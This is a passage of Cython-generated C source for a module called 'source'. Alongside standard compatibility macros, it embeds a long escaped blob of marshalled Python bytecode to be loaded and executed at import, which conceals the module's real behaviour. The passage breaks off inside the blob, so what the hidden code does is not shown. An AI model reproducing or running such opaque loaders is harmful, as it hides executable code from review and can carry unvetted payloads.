  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)
#endif
#if CYTHON_ASSUME_SAFE_MACROS
  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)
#else
  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyIntObject                  PyLongObject
  #define PyInt_Type                   PyLong_Type
  #define PyInt_Check(op)              PyLong_Check(op)
  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)
  #define PyInt_FromString             PyLong_FromString
  #define PyInt_FromUnicode            PyLong_FromUnicode
  #define PyInt_FromLong               PyLong_FromLong
  #define PyInt_FromSize_t             PyLong_FromSize_t
  #define PyInt_FromSsize_t            PyLong_FromSsize_t
  #define PyInt_AsLong                 PyLong_AsLong
  #define PyInt_AS_LONG                PyLong_AS_LONG
  #define PyInt_AsSsize_t              PyLong_AsSsize_t
  #define PyInt_AsUnsignedLongMask     PyLong_AsUnsignedLongMask
  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask
  #define PyNumber_Int                 PyNumber_Long
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBoolObject                 PyLongObject
#endif
#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY
  #ifndef PyUnicode_InternFromString
    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)
  #endif
#endif
#if PY_VERSION_HEX < 0x030200A4
  typedef long Py_hash_t;
  #define __Pyx_PyInt_FromHash_t PyInt_FromLong
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t
#else
  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyMethod_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))
#else
  #define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)
#endif
#if CYTHON_USE_ASYNC_SLOTS
  #if PY_VERSION_HEX >= 0x030500B1
    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods
    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)
  #else
    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))
  #endif
#else
  #define __Pyx_PyType_AsAsync(obj) NULL
#endif
#ifndef __Pyx_PyAsyncMethodsStruct
    typedef struct {
        unaryfunc am_await;
        unaryfunc am_aiter;
        unaryfunc am_anext;
    } __Pyx_PyAsyncMethodsStruct;
#endif

#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)
  #if !defined(_USE_MATH_DEFINES)
    #define _USE_MATH_DEFINES
  #endif
#endif
#include <math.h>
#ifdef NAN
#define __PYX_NAN() ((float) NAN)
#else
static CYTHON_INLINE float __PYX_NAN() {
  float value;
  memset(&value, 0xFF, sizeof(value));
  return value;
}
#endif
#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)
#define __Pyx_truncl trunc
#else
#define __Pyx_truncl truncl
#endif

#define __PYX_MARK_ERR_POS(f_index, lineno) \
    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }
#define __PYX_ERR(f_index, lineno, Ln_error) \
    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }

#ifndef __PYX_EXTERN_C
  #ifdef __cplusplus
    #define __PYX_EXTERN_C extern "C"
  #else
    #define __PYX_EXTERN_C extern
  #endif
#endif

#define __PYX_HAVE__source
#define __PYX_HAVE_API__source
/* Early includes */
#ifdef _OPENMP
#include <omp.h>
#endif /* _OPENMP */

#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)
#define CYTHON_WITHOUT_ASSERTIONS
#endif

typedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;
                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;

#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)
#define __PYX_DEFAULT_STRING_ENCODING ""
#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString
#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#define __Pyx_uchar_cast(c) ((unsigned char)c)
#define __Pyx_long_cast(x) ((long)x)
#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\
    (sizeof(type) < sizeof(Py_ssize_t))  ||\
    (sizeof(type) > sizeof(Py_ssize_t) &&\
          likely(v < (type)PY_SSIZE_T_MAX ||\
                 v == (type)PY_SSIZE_T_MAX)  &&\
          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\
                                v == (type)PY_SSIZE_T_MIN)))  ||\
    (sizeof(type) == sizeof(Py_ssize_t) &&\
          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\
                               v == (type)PY_SSIZE_T_MAX)))  )
static CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {
    return (size_t) i < (size_t) limit;
}
#if defined (__cplusplus) && __cplusplus >= 201103L
    #include <cstdlib>
    #define __Pyx_sst_abs(value) std::abs(value)
#elif SIZEOF_INT >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) abs(value)
#elif SIZEOF_LONG >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) labs(value)
#elif defined (_MSC_VER)
    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))
#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define __Pyx_sst_abs(value) llabs(value)
#elif defined (__GNUC__)
    #define __Pyx_sst_abs(value) __builtin_llabs(value)
#else
    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);
#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))
#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)
#define __Pyx_PyBytes_FromString        PyBytes_FromString
#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);
#if PY_MAJOR_VERSION < 3
    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#else
    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize
#endif
#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)
#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)
#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)
#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)
#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)
static CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u) {
    const Py_UNICODE *u_end = u;
    while (*u_end++) ;
    return (size_t)(u_end - u - 1);
}
#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))
#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode
#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode
#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)
#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);
#define __Pyx_PySequence_Tuple(obj)\
    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t);
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);
#if CYTHON_ASSUME_SAFE_MACROS
#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))
#else
#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)
#endif
#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))
#else
#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))
#endif
#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
static int __Pyx_sys_getdefaultencoding_not_ascii;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    PyObject* ascii_chars_u = NULL;
    PyObject* ascii_chars_b = NULL;
    const char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    if (strcmp(default_encoding_c, "ascii") == 0) {
        __Pyx_sys_getdefaultencoding_not_ascii = 0;
    } else {
        char ascii_chars[128];
        int c;
        for (c = 0; c < 128; c++) {
            ascii_chars[c] = c;
        }
        __Pyx_sys_getdefaultencoding_not_ascii = 1;
        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);
        if (!ascii_chars_u) goto bad;
        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);
        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {
            PyErr_Format(
                PyExc_ValueError,
                "This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.",
                default_encoding_c);
            goto bad;
        }
        Py_DECREF(ascii_chars_u);
        Py_DECREF(ascii_chars_b);
    }
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    Py_XDECREF(ascii_chars_u);
    Py_XDECREF(ascii_chars_b);
    return -1;
}
#endif
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)
#else
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
static char* __PYX_DEFAULT_STRING_ENCODING;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);
    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;
    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    return -1;
}
#endif
#endif


/* Test for GCC > 2.95 */
#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))
  #define likely(x)   __builtin_expect(!!(x), 1)
  #define unlikely(x) __builtin_expect(!!(x), 0)
#else /* !__GNUC__ or GCC < 2.95 */
  #define likely(x)   (x)
  #define unlikely(x) (x)
#endif /* __GNUC__ */
static CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }

static PyObject *__pyx_m = NULL;
static PyObject *__pyx_d;
static PyObject *__pyx_b;
static PyObject *__pyx_cython_runtime = NULL;
static PyObject *__pyx_empty_tuple;
static PyObject *__pyx_empty_bytes;
static PyObject *__pyx_empty_unicode;
static int __pyx_lineno;
static int __pyx_clineno = 0;
static const char * __pyx_cfilenm= __FILE__;
static const char *__pyx_filename;


static const char *__pyx_f[] = {
  "source.py",
};

/*--- Type declarations ---*/

/* --- Runtime support code (head) --- */
/* Refnanny.proto */
#ifndef CYTHON_REFNANNY
  #define CYTHON_REFNANNY 0
#endif
#if CYTHON_REFNANNY
  typedef struct {
    void (*INCREF)(void*, PyObject*, int);
    void (*DECREF)(void*, PyObject*, int);
    void (*GOTREF)(void*, PyObject*, int);
    void (*GIVEREF)(void*, PyObject*, int);
    void* (*SetupContext)(const char*, int, const char*);
    void (*FinishContext)(void**);
  } __Pyx_RefNannyAPIStruct;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);
  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;
#ifdef WITH_THREAD
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          if (acquire_gil) {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
              PyGILState_Release(__pyx_gilstate_save);\
          } else {\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
          }
#else
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__)
#endif
  #define __Pyx_RefNannyFinishContext()\
          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)
  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)
  #define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)
  #define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)
  #define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} while(0)
#else
  #define __Pyx_RefNannyDeclarations
  #define __Pyx_RefNannySetupContext(name, acquire_gil)
  #define __Pyx_RefNannyFinishContext()
  #define __Pyx_INCREF(r) Py_INCREF(r)
  #define __Pyx_DECREF(r) Py_DECREF(r)
  #define __Pyx_GOTREF(r)
  #define __Pyx_GIVEREF(r)
  #define __Pyx_XINCREF(r) Py_XINCREF(r)
  #define __Pyx_XDECREF(r) Py_XDECREF(r)
  #define __Pyx_XGOTREF(r)
  #define __Pyx_XGIVEREF(r)
#endif
#define __Pyx_XDECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_XDECREF(tmp);\
    } while (0)
#define __Pyx_DECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_DECREF(tmp);\
    } while (0)
#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)
#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)

/* PyObjectGetAttrStr.proto */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)
#endif

/* Import.proto */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level);

/* GetAttr.proto */
static CYTHON_INLINE PyObject *__Pyx_GetAttr(PyObject *, PyObject *);

/* Globals.proto */
static PyObject* __Pyx_Globals(void);

/* PyExec.proto */
static PyObject* __Pyx_PyExec3(PyObject*, PyObject*, PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyExec2(PyObject*, PyObject*);

/* PyExecGlobals.proto */
static PyObject* __Pyx_PyExecGlobals(PyObject*);

/* GetBuiltinName.proto */
static PyObject *__Pyx_GetBuiltinName(PyObject *name);

/* PyDictVersioning.proto */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)
#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\
    (version_var) = __PYX_GET_DICT_VERSION(dict);\
    (cache_var) = (value);
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\
        (VAR) = __pyx_dict_cached_value;\
    } else {\
        (VAR) = __pyx_dict_cached_value = (LOOKUP);\
        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\
    }\
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);
#else
#define __PYX_GET_DICT_VERSION(dict)  (0)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);
#endif

/* GetModuleGlobalName.proto */
#if CYTHON_USE_DICT_VERSIONS
#define __Pyx_GetModuleGlobalName(var, name)  do {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\
        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\
        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  do {\
    PY_UINT64_T __pyx_dict_version;\
    PyObject *__pyx_dict_cached_value;\
    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);
#else
#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);
#endif

/* PyObjectCall.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);
#else
#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)
#endif

/* PyThreadStateGet.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;
#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;
#define __Pyx_PyErr_Occurred()  __pyx_tstate->curexc_type
#else
#define __Pyx_PyThreadState_declare
#define __Pyx_PyThreadState_assign
#define __Pyx_PyErr_Occurred()  PyErr_Occurred()
#endif

/* PyErrFetchRestore.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)
#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))
#else
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#endif
#else
#define __Pyx_PyErr_Clear() PyErr_Clear()
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)
#endif

/* CLineInTraceback.proto */
#ifdef CYTHON_CLINE_IN_TRACEBACK
#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)
#else
static int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line);
#endif

/* CodeObjectCache.proto */
typedef struct {
    PyCodeObject* code_object;
    int code_line;
} __Pyx_CodeObjectCacheEntry;
struct __Pyx_CodeObjectCache {
    int count;
    int max_count;
    __Pyx_CodeObjectCacheEntry* entries;
};
static struct __Pyx_CodeObjectCache __pyx_code_cache = {0,0,NULL};
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line);
static PyCodeObject *__pyx_find_code_object(int code_line);
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object);

/* AddTraceback.proto */
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename);

/* GCCDiagnostics.proto */
#if defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))
#define __Pyx_HAS_GCC_DIAGNOSTIC
#endif

/* CIntToPy.proto */
static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value);

/* CIntFromPy.proto */
static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *);

/* CIntFromPy.proto */
static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *);

/* FastTypeChecks.proto */
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject *type);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2);
#else
#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)
#define __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)
#define __Pyx_PyErr_GivenExceptionMatches2(err, type1, type2) (PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2))
#endif
#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)

/* CheckBinaryVersion.proto */
static int __Pyx_check_binary_version(void);

/* InitStrings.proto */
static int __Pyx_InitStrings(__Pyx_StringTabEntry *t);


/* Module declarations from 'source' */
#define __Pyx_MODULE_NAME "source"
extern int __pyx_module_is_main_source;
int __pyx_module_is_main_source = 0;

/* Implementation of 'source' */
static const char __pyx_k_main[] = "__main__";
static const char __pyx_k_name[] = "__name__";
static const char __pyx_k_test[] = "__test__";
static const char __pyx_k_loads[] = "loads";
static const char __pyx_k_import[] = "__import__";
static const char __pyx_k_marshal[] = "marshal";
static const char __pyx_k_builtins[] = "__builtins__";
static const char __pyx_k_cline_in_traceback[] = "cline_in_traceback";
static const char __pyx_k_c_d_d_l_Z_d_d_l_Z_d_Z_d_Z_e_d_d[] = "c\000\000\000\000\000\000\000\000\000\000\000\000\007\000\000\000\000\000\000\000\363\324\004\000\000\227\000d\000d\001l\000Z\000d\000d\001l\001Z\001d\002Z\002d\003\204\000Z\003\002\000e\003\246\000\000\000\253\000\000\000\000\000\000\000\000\000\001\000d\000d\001l\000Z\000d\000d\001l\001Z\001d\004Z\002d\005\204\000Z\003\002\000e\003\246\000\000\000\253\000\000\000\000\000\000\000\000\000\001\000\002\000e\004d\006\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000d\007Z\005d\010Z\006d\tZ\007d\nZ\010d\013Z\td\014Z\nd\013Z\013d\rZ\014d\016Z\rd\017Z\016d\000d\001l\000Z\000d\000d\001l\017Z\017d\000d\001l\000Z\000d\000d\001l\017Z\017\002\000e\020e\005\233\000d\020\235\002\246\001\000\000\253\001\000\000\000\000\000\000\000\000Z\021\t\000\002\000e\000j\022\000\000\000\000\000\000\000\000d\021\246\001\000\000\253\001\000\000\000\000\000\000\000\000Z\023e\023\240\024\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000\001\000e\023j\025\000\000\000\000\000\000\000\000\240\026\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\246\000\000\000\253\000\000\000\000\000\000\000\000\000Z\027n+#\000e\000j\030\000\000\000\000\000\000\000\000$\000r\036\001\000\002\000e\004d\022\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e\017j\031\000\000\000\000\000\000\000\000d\023\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000Y\000n\004w\000x\003Y\000w\001e\021e\027v\000r\014\002\000e\004d\024\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000n\033\002\000e\004d\025\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e\017j\031\000\000\000\000\000\000\000\000d\000\246\001\000\000\253\001\000\000\000\000\000\000\000\000\001\000\002\000e\020e\006\233\000d\026\235\002\246\001\000\000\253\001\000\000\000\000\000\000\000\000Z\032d\000d\001l\033Z\033d\000d\001l\034Z\034d\000d\001l\000Z\000d\000d\001l""\035Z\035d\000d\001l\036Z\036d\000d\001l\037Z\037d\000d\027l 